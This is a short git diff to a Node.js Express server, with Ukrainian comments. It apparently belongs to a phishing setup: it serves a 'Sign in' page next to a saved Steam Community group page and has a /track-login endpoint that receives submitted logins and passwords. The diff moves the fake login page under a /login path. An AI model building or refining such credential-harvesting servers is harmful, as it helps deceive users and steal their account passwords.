@@ -10,7 +10,7 @@ app.use(cors());
 app.use(bodyParser.json());
 
 // Роздаємо всі файли з папки "public"
-app.use(express.static(path.join(__dirname, "public")));
+app.use("/login", express.static(path.join(__dirname, "public", "login")));
 
 app.post("/track-login", (req, res) => {
     const { login, password } = req.body;
@@ -27,9 +27,10 @@ app.post("/track-login", (req, res) => {
 //    res.sendFile(path.join(__dirname, "group", "Спільнота Steam __ Група __ Один раз не....html"));
 //});
 
-app.get("/", (req, res) => {
-    res.sendFile(path.join(__dirname, "public", "Увійти.html"));
+app.get("/login/", (req, res) => {
+    res.sendFile(path.join(__dirname, "public", "login", "Увійти.html"));
 });
+
 
 app.listen(PORT, () => {
     console.log(`Server is running at http://localhost:${PORT}`);
